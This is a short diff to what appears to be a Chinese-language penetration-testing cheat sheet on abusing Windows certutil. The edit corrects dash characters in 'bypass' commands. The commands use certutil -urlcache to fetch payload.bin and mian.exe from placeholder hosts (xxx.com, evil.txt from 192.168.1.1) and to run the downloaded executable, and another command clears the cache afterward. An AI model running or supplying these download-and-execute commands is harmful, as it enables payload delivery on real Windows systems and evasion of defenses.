@@ -104,9 +104,9 @@ certutil 用于备份证书服务，支持 xp-win10 都支持。由于 certutil 
 certutil -urlcache -split -f http://192.168.1.1/evil.txt test.php
 
 # bypass技巧
-certutil & Certutil –urlcache –split –f  https://xxx.com/test/payload.bin payload.bin
-certutil & Certutil –urlcache –split –f  https://xxx.com/test/mian.exe mian.exe & mian.exe
-certutil | Certutil –urlcache –split –f  https://xxx.com/test/payload.bin payload1.bin
+certutil & Certutil -urlcache -split -f  https://xxx.com/test/payload.bin payload.bin
+certutil & Certutil -urlcache -split -f  https://xxx.com/test/mian.exe mian.exe & mian.exe
+certutil | Certutil -urlcache -split -f  https://xxx.com/test/payload.bin payload1.bin
 
 # 删除缓存
 certutil -urlcache -split -f http://192.168.1.1/evil.txt delete
